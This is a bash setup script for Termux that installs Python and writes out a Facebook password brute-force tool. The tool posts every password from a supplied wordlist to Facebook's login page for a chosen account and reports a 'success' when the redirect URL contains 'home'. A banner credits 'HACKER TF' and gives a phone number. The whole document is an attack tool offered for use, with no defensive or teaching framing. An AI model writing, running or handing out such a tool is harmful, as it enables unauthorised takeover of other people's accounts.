#!/bin/bash

echo "Updating Termux..."
pkg update && pkg upgrade -y

echo "Installing Python and required libraries..."
pkg install python -y
pip install requests

echo "Creating the brute force script..."

cat << EOF > facebook_bruteforce.py
import requests
import os

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

print(f"\n{BLUE}==============================")
print("      Made By HACKER TF       ")
print("       923321709972.          ")
print("==============================\n" + RESET)

login_url = "https://www.facebook.com/login.php"
username = input(f"{YELLOW}Enter Facebook Email/Username: {RESET}")
password_file = input(f"{YELLOW}Enter the path of your password list: {RESET}")

if not os.path.exists(password_file):
    print(f"\n{RED}[ERROR] Password list file not found!{RESET}\n")
    exit()

with open(password_file, "r") as file:
    password_list = [line.strip() for line in file]

print(f"\n{BLUE}[INFO] Trying {len(password_list)} passwords for {username}...\n{RESET}")

def try_login(password):
    session = requests.Session()
    data = {"email": username, "pass": password}
    response = session.post(login_url, data=data)

    if "home" in response.url:
        print(f"\n{GREEN}[SUCCESS] Password found: {password}{RESET}\n")
        exit()
    else:
        print(f"{RED}[FAILED] {password}{RESET}")

for password in password_list:
    try_login(password)

print(f"\n{YELLOW}[INFO] Password not found in the list.{RESET}\n")
EOF

chmod +x facebook_bruteforce.py

echo "Setup complete! Run script using: python facebook_bruteforce.py"
